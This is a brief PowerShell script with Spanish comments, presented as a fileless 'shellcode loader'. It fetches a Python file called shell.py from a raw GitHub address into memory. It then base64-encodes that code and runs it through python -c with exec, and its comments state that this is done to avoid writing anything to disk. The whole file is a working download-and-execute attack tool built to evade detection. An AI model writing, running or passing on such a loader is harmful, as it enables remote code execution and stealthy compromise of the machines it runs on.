cls
Write-Host "[+] Ejecutando shellcode loader (Python fileless)..." -ForegroundColor Cyan

# URL de tu script Python en GitHub (RAW)
$url = "https://raw.githubusercontent.com/AL4AROX/CodeBin/refs/heads/main/shell.py"

# Descargar el código Python a memoria
$code = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content

# Codificar a Base64 para pasarlo a python -c sin problemas
$bytes = [System.Text.Encoding]::UTF8.GetBytes($code)
$b64 = [Convert]::ToBase64String($bytes)

# Ejecutar Python con el código decodificado (sin tocar el disco)
python -c "import base64; exec(base64.b64decode('$b64').decode('utf-8'))"

Write-Host "[+] Proceso finalizado." -ForegroundColor Cyan
